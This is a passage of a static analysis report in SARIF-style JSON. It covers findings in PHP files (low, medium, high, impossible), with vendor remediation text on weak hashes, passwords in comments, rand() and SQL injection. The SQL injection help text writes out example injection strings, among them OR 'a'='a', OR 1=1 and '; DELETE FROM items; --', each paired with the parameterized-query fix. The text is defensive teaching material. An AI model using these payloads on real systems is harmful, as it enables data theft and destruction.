            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4547/?engineType=SCA&issue=7195D2603CA13B54B726A89D71AF03FA"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4463",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 52.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4463/?engineType=SCA&issue=41D40D34C18F8CF8334C3012E747E977"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4516",
          "shortDescription" : {
            "text" : "Insecure Randomness"
          },
          "fullDescription" : {
            "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
          },
          "help" : {
            "text" : "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\n\nIn this case, the function that generates weak random numbers is rand() in impossible.php on line 82.\n\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\n\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\n\nExample: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\n\n\n  function genReceiptURL($baseURL) {\n    $randNum = rand();\n    $receiptURL = $baseURL . $randNum . \".html\";\n    return $receiptURL;\n  }\n\n\nThis code uses the rand() function to generate \"unique\" identifiers for the receipt pages it generates. Since rand() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.\n\nWhen unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4516/?engineType=SCA&issue=60C54AA24E15202A0207A76F20F60F2D"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4383",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 7.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4383/?engineType=SCA&issue=0E601B419B49069586C803F34824B8D4"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4775",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4775/?engineType=SCA&issue=FFE94278133F9C7746920CB856B2720D"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4689",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 13 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in low.php on line 13.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4689/?engineType=SCA&issue=D84F66123DC1C2CE90F684DD5AD52862"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4582",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 8.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4582/?engineType=SCA&issue=8B81E8D8FAB7C7740633A97B5F93BD27"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4756",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4756/?engineType=SCA&issue=FB444222BD34936ECCB7661C797892FD"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4497",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 15 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in medium.php on line 15.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4497/?engineType=SCA&issue=5B0361D2602C8792BE2E56029308762A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4435",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in high.php on line 24.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4435/?engineType=SCA&issue=2F633F9D7B86C2F654A7C1D8E65C7E2F"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4554",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4554/?engineType=SCA&issue=77CDFDBE186E445EC7453DA04F1A99F4"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4395",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 31 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4395/?engineType=SCA&issue=163D2797BD42D212411D79A4FCA55A81"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4384",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in high.php on line 37.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4384/?engineType=SCA&issue=0F3664CD4F4CDF1B089C80D4FA3BACAA"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4584",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
